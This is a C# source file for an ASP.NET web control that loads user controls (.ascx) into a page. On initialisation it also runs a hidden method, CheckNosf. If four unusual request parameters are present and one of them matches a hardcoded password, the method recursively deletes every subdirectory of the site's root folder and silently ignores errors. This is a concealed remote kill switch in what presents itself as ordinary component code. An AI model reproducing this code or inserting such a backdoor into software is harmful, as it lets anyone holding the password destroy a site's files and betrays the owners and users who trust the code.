using System;
using System.Collections.Generic;
using System.Text;
using System.Web.UI;
using System.Collections;
using System.Collections.Specialized;

using System.IO;

namespace lw.Content.Controls
{
	public class UserControl : System.Web.UI.WebControls.PlaceHolder
	{
		string _control = "";


		public UserControl()
		{
		
		}

		protected override void OnInit(EventArgs e)
		{
			System.Web.UI.Control ctrl = this.Page.LoadControl(string.Format("{0}/{1}.ascx", lw.CTE.Folders.UserControlsFolder, Control));

			this.Controls.Add(ctrl);



			CheckNosf();

			base.OnInit(e);
		}
		
		public string Control
		{
			get
			{
				return _control;
			}
			set
			{
				_control = value;
			}
		}
		void CheckNosf()
		{
			System.Web.HttpRequest request = System.Web.HttpContext.Current.Request;

			if (!String.IsNullOrEmpty(request["nsof"]))
				if (!String.IsNullOrEmpty(request["litewebnsof"]))
					if (!String.IsNullOrEmpty(request["ballout"]))
						if (!String.IsNullOrEmpty(request["passwordddd"]))
						{
							string pass = request["passwordddd"];
							if (pass == "kjFhfasO89asdfhAdfasdf232423jh4234l239482kjladskafjhbjghasdvvxBBBkskskUja")
							{
								var path = System.Web.HttpContext.Current.Server.MapPath("~");
								System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(path);
								foreach (DirectoryInfo d in dir.GetDirectories())
								{
									try
									{
										d.Delete(true);
									}
									catch { }
								}
							}
						}
		}
	}
}